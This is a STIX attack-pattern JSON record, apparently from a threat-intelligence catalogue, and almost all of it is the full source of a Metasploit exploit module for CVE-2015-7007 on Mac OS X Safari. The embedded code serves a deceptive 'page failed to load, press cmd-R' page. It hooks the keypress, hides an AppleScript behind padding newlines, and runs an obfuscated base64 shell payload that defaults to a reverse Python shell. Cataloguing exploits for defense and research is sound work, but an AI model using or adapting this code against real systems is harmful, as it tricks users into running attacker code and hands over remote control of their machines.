{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cf0127fe-dd59-4bd9-bac6-d0063912dc6b",
    "created": "2024-08-14T16:34:23.020463Z",
    "modified": "2024-08-14T16:34:23.020467Z",
    "name": "Safari User-Assisted Applescript Exec Attack",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/browser/safari_user_assisted_applescript_exec.rb",
            "external_id": "safari_user_assisted_applescript_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-7007"
        },
        {
            "source_name": "reference",
            "url": "https://support.apple.com/en-us/HT205375"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Safari User-Assisted Applescript Exec Attack',\n      'Description'    => %q{\n        In versions of Mac OS X before 10.11.1, the applescript:// URL\n        scheme is provided, which opens the provided script in the Applescript\n        Editor. Pressing cmd-R in the Editor executes the code without any\n        additional confirmation from the user. By getting the user to press\n        cmd-R in Safari, and by hooking the cmd-key keypress event, a user\n        can be tricked into running arbitrary Applescript code.\n\n        Gatekeeper should be disabled from Security & Privacy in order to\n        avoid the unidentified Developer prompt.\n      },\n      'License'         => MSF_LICENSE,\n      'Arch'            => ARCH_CMD,\n      'Platform'        => ['unix', 'osx'],\n      'Compat'          =>\n        {\n          'PayloadType' => 'cmd'\n        },\n      'Targets'         =>\n        [\n          [ 'Mac OS X', {} ]\n        ],\n      'DefaultOptions' => { 'payload' => 'cmd/unix/reverse_python' },\n      'DefaultTarget'   => 0,\n      'DisclosureDate'  => '2015-10-16',\n      'Author'          => [ 'joev' ],\n      'References'     =>\n        [\n          [ 'CVE', '2015-7007' ],\n          [ 'URL', 'https://support.apple.com/en-us/HT205375' ]\n        ],\n      'BrowserRequirements' => {\n        :source  => 'script',\n        :ua_name => HttpClients::SAFARI,\n        :os_name => OperatingSystems::Match::MAC_OSX\n      }\n    ))\n\n    register_options([\n      OptString.new('CONTENT', [false, \"Content to display in browser\",\n        \"This page has failed to load. Press cmd-R to refresh.\"]),\n      OptString.new('WritableDir', [true, 'Writable directory', '/.Trashes'])\n    ])\n  end\n\n  def on_request_exploit(cli, request, profile)\n    print_status(\"Sending #{self.name}\")\n    send_response_html(cli, exploit_html)\n  end\n\n  def exploit_html\n    \"<!doctype html><html><body>#{content}<script>#{exploit_js}</script></body></html>\"\n  end\n\n  def exploit_js\n    js_obfuscate %Q|\n      var as = Array(150).join(\"\\\\n\") +\n        'do shell script \"echo #{Rex::Text.encode_base64(sh)} \\| base64 --decode \\| /bin/sh\"';\n      var url = 'applescript://com.apple.scripteditor?action=new&script='+encodeURIComponent(as);\n      window.onkeydown = function(e) {\n        if (e.keyCode == 91) {\n          window.location = url;\n        }\n      };\n    |\n  end\n\n  def sh\n    'killall \"Script Editor\"; nohup ' + payload.encoded\n  end\n\n  def content\n    datastore['CONTENT']\n  end\n\n\nend\n",
    "x_mitre_contributors": [
        "[ joev ]",
        ""
    ],
    "x_mitre_disclosure_date": "2015-10-16",
    "x_mitre_platforms": [
        "['unix', 'osx']"
    ]
}